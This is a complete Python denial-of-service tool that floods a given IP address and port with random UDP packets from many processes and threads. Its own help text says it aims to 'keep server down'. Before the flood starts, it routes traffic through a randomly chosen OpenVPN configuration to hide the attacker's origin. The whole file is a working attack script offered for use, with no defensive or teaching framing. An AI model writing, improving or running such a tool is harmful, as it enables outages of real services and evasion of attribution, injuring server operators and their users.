import socket
import multiprocessing
import threading
import time
import argparse
import os
import subprocess
import random

def generate_random_payload():
    return os.urandom(20)

def send_packets(target_ip, target_port, end_time):
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while time.time() < end_time:
        try:
            payload = generate_random_payload()
            for _ in range(200):
                client.sendto(payload, (target_ip, target_port))
        except socket.error:
            break
    client.close()

def flood(target_ip, target_port, duration):
    end_time = time.time() + duration
    threads = []
    for _ in range(8):
        thread = threading.Thread(target=send_packets, args=(target_ip, target_port, end_time))
        thread.start()
        threads.append(thread)
    for thread in threads:
        thread.join()

def udp_flood(target_ip, target_port, duration):
    num_cores = multiprocessing.cpu_count()
    num_processes = int(num_cores * 0.9)
    processes = []
    for _ in range(num_processes):
        process = multiprocessing.Process(target=flood, args=(target_ip, target_port, duration))
        process.start()
        processes.append(process)
    for process in processes:
        process.join()

def connect_random_vpn():
    vpn_files = [f for f in os.listdir('proxy') if f.endswith('.ovpn')]
    random_vpn_file = random.choice(vpn_files)
    vpn_process = subprocess.Popen(['sudo', 'openvpn', '--config', f'proxy/{random_vpn_file}'])
    return vpn_process

def show_current_ip():
    result = subprocess.run(['curl', 'ifconfig.me'], capture_output=True, text=True)
    print(f"Current public IP: {result.stdout.strip()}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="High-intensity UDP flood script to keep server down.")
    parser.add_argument('target_ip', help="Target IP address.")
    parser.add_argument('target_port', type=int, help="Target port number.")
    parser.add_argument('duration', type=int, help="Duration of the flood in seconds.")

    args = parser.parse_args()

    vpn = connect_random_vpn()

    time.sleep(10)  # Adjust based on VPN connection time

    show_current_ip()

    udp_flood(args.target_ip, args.target_port, args.duration)

    vpn.terminate()
